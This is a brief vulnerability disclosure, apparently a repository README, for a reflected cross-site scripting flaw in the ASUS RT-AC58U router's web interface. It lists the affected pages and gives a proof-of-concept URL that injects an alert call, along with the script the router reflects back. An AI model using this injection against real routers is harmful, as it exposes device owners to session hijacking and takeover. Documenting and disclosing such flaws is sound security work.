# AsusXSS     
Newly discovered XSS in ASUS RT-AC58U website components.     

# Vulnerable components       
Advanced_ASUSDDNS_Content.asp       
Advanced_WSecurity_Content.asp        
Advanced_Wireless_Content.asp       
Logout.asp        
Main_Login.asp        
MobileQIS_Login.asp         
QIS_wizard.htma       
YandexDNS.asp       
ajax_status.xml         
apply.cgi         
clients.asp         
disk.asp      
disk_utility.asp        
internet.asp      
and any other component which is not accesible when not logged in.        
# How it works        
Target opens prepared URL:               
``192.168.1.1/Advanced_Wireless_Content.aspn9mn0'-alert(1)-'grqb0``       
which is vulnerable to Reflected XSS.       
Website returns website with this code:               
`<script>top.location.href='/Main_Login.asp?error_status=7&page=Advanced_Wireless_Content.aspn9mn0'-alert(1)-'grqb0&lock_time=31'</script>`         



